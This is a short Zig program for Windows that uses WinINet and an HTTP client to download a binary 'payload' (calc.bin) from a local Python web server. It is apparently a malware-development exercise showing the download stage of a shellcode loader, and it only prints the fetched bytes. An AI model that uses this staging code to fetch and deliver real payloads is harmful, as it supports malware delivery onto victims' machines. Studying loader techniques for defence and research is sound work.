// Run the web server using the following command:
// python3 -m http.server 8000

const std = @import("std");
const win = std.os.windows;

const WINAPI = win.WINAPI;
const BOOL = win.BOOL;
const GetLastError = win.kernel32.GetLastError;

extern "wininet" fn InternetOpenW(
    lpszAgent: ?[*:0]const u16,
    dwAccessType: u32,
    lpszProxy: ?[*:0]const u16,
    lpszProxyBypass: ?[*:0]const u16,
    dwFlags: u32,
) callconv(WINAPI) ?*anyopaque;

extern "wininet" fn InternetOpenUrlW(
    hInternet: ?*anyopaque,
    lpszUrl: ?[*:0]const u16,
    lpszHeaders: ?[*:0]const u16,
    dwHeadersLength: u32,
    dwFlags: u32,
    dwContext: usize,
) callconv(WINAPI) ?*anyopaque;

extern "wininet" fn InternetReadFile(
    hFile: ?*anyopaque,
    lpBuffer: ?*anyopaque,
    dwNumberOfBytesToRead: u32,
    lpdwNumberOfBytesRead: ?*u32,
) callconv(WINAPI) BOOL;

extern "wininet" fn InternetCloseHandle(
    hInternet: ?*anyopaque,
) callconv(WINAPI) BOOL;

extern "wininet" fn InternetSetOptionW(
    hInternet: ?*anyopaque,
    dwOption: u32,
    lpBuffer: ?*anyopaque,
    dwBufferLength: u32,
) callconv(WINAPI) BOOL;

const INTERNET_FLAG_HYPERLINK: u32 = 1024;
const INTERNET_FLAG_IGNORE_CERT_DATE_INVALID: u32 = 8192;
const INTERNET_OPTION_SETTINGS_CHANGED: u32 = 39;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const payload = try getPayloadFromUrl(allocator, "http://127.0.0.1:8000/calc.bin");
    defer allocator.free(payload);

    std.debug.print("payload: {any}\n", .{payload});
}

fn getPayloadFromUrl(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
    const h_internet = InternetOpenW(
        null,
        0,
        null,
        null,
        0,
    ) orelse {
        std.debug.print("[!] InternetOpenW Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.InternetOpenWFailed;
    };
    defer _ = InternetCloseHandle(h_internet);

    const url_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, url);
    defer allocator.free(url_utf16);

    const h_file = InternetOpenUrlW(
        h_internet,
        url_utf16,
        null,
        0,
        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        0,
    ) orelse {
        std.debug.print("[!] InternetOpenUrlW Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.InternetOpenUrlWFailed;
    };
    defer _ = InternetCloseHandle(h_file);

    var tmp_buf: [1024]u8 = undefined;
    var number_of_bytes_read: u32 = undefined;
    var payload_size: usize = 0;
    var payload = try allocator.alloc(u8, 0);
    errdefer allocator.free(payload);

    while (true) {
        if (InternetReadFile(h_file, &tmp_buf, 1024, &number_of_bytes_read) == 0) {
            std.debug.print("[!] InternetReadFile Failed With Error: {s}\n", .{@tagName(GetLastError())});
            return error.InternetReadFileFailed;
        }

        payload_size += number_of_bytes_read;

        payload = try allocator.realloc(payload, payload_size);
        std.mem.copyForwards(u8, payload[payload_size - number_of_bytes_read ..], tmp_buf[0..number_of_bytes_read]);

        if (number_of_bytes_read < 1024) break;
    }

    defer if (InternetSetOptionW(
        null,
        INTERNET_OPTION_SETTINGS_CHANGED,
        null,
        0,
    ) == 0) std.debug.print("[!] InternetSetOptionW Failed With Error: {s}\n", .{@tagName(GetLastError())});

    return payload;
}

fn getPayloadFromUrl2(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
    var client = std.http.Client{ .allocator = allocator };
    defer client.deinit();

    const uri = try std.Uri.parse(url);
    var header_buf: [1024]u8 = undefined;
    var request = try client.open(.GET, uri, .{ .server_header_buffer = &header_buf });
    defer request.deinit();

    try request.send();
    try request.wait();

    const paylaod = try request.reader().readAllAlloc(allocator, std.math.maxInt(usize));

    return paylaod;
}
